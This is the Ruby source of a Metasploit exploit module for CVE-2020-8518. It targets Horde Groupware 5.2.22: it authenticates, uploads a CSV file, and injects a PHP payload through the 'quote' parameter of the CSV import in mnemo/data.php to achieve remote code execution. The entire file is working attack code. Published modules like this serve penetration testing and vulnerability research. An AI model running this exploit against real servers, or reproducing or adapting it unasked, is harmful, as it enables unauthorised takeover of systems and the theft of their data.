# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(
      update_info(
        info,
        &#039;Name&#039;           => &#039;Horde CSV import arbitrary PHP code execution&#039;,
        &#039;Description&#039;    => %q{

          Groupware version 5.2.22 allows authenticated users to inject
          arbitrary PHP code thus achieving RCE on the server hosting the web
          application.

        },
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Author&#039;         => [&#039;Andrea Cardaci <cyrus.and@gmail.com>&#039;],
        &#039;References&#039;     => [
          [&#039;CVE&#039;, &#039;2020-8518&#039;],
          [&#039;URL&#039;, &#039;https://cardaci.xyz/advisories/2020/03/10/horde-groupware-webmail-edition-5.2.22-rce-in-csv-data-import/&#039;]
        ],
        &#039;DisclosureDate&#039; => &#039;2020-02-07&#039;,
        &#039;Platform&#039;       => &#039;php&#039;,
        &#039;Arch&#039;           => ARCH_PHP,
        &#039;Targets&#039;        => [[&#039;Automatic&#039;, {}]],
        &#039;Payload&#039;        => {&#039;BadChars&#039; => "&#039;"},
        &#039;Privileged&#039;     => false,
        &#039;DefaultOptions&#039;  => { &#039;PrependFork&#039;  => true },
        &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to the web application&#039;, &#039;/&#039;]),
        OptString.new(&#039;USERNAME&#039;,  [true, &#039;The username to authenticate with&#039;]),
        OptString.new(&#039;PASSWORD&#039;,  [true, &#039;The password to authenticate with&#039;])
      ])
  end

  def login
    username = datastore[&#039;USERNAME&#039;]
    password = datastore[&#039;PASSWORD&#039;]
    res = send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri, &#039;login.php&#039;),
      &#039;cookie&#039;    => &#039;Horde=x&#039;, # avoid multiple Set-Cookie
      &#039;vars_post&#039; => {
        &#039;horde_user&#039; => username,
        &#039;horde_pass&#039; => password,
        &#039;login_post&#039; => &#039;1&#039;})
    unless res && res.code == 302 && res.headers[&#039;Location&#039;].include?(&#039;/services/portal/&#039;)
      fail_with(Failure::UnexpectedReply, &#039;Login failed or application not found&#039;)
    end

    vprint_good("Logged in as #{username}:#{password}")
    return res.get_cookies
  end

  def upload_csv(cookie)
    csv_fname = Rex::Text.rand_text_alpha(6..8)

    data = Rex::MIME::Message.new
    data.add_part(&#039;11&#039;,  nil, nil, &#039;form-data; name="actionID"&#039;)
    data.add_part(&#039;1&#039;,   nil, nil, &#039;form-data; name="import_step"&#039;)
    data.add_part(&#039;csv&#039;, nil, nil, &#039;form-data; name="import_format"&#039;)
    data.add_part(&#039;x&#039;,   nil, nil, &#039;form-data; name="notepad_target"&#039;)
    data.add_part(csv_fname,   nil, nil, "form-data; name=\"import_file\"; filename=\"#{csv_fname}\"")
    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri, &#039;mnemo/data.php&#039;),
      &#039;cookie&#039; => cookie,
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;   => data.to_s)

    vprint_status("Uploading #{csv_fname}.csv")

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, &#039;Cannot upload the CSV file&#039;)
    end

    vprint_good(&#039;CSV file uploaded&#039;)
  end

  def execute(cookie, function_call)
    options = {
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri, &#039;mnemo/data.php&#039;),
      &#039;cookie&#039;    => cookie,
      &#039;vars_post&#039; => {
        &#039;actionID&#039;      => &#039;3&#039;,
        &#039;import_step&#039;   => &#039;2&#039;,
        &#039;import_format&#039; => &#039;csv&#039;,
        &#039;header&#039;        => &#039;1&#039;,
        &#039;fields&#039;        => &#039;1&#039;,
        &#039;sep&#039;           => &#039;x&#039;,
        &#039;quote&#039;         => ").#{function_call}.die();}//\\"}}

    send_request_cgi(options)
  end

  def exploit
    cookie = login()
    upload_csv(cookie)
    # do not terminate the statement
    function_call = payload.encoded.tr(&#039;;&#039;, &#039;&#039;)
    vprint_status("Sending payload: #{function_call}")
    execute(cookie, function_call)
  end
end

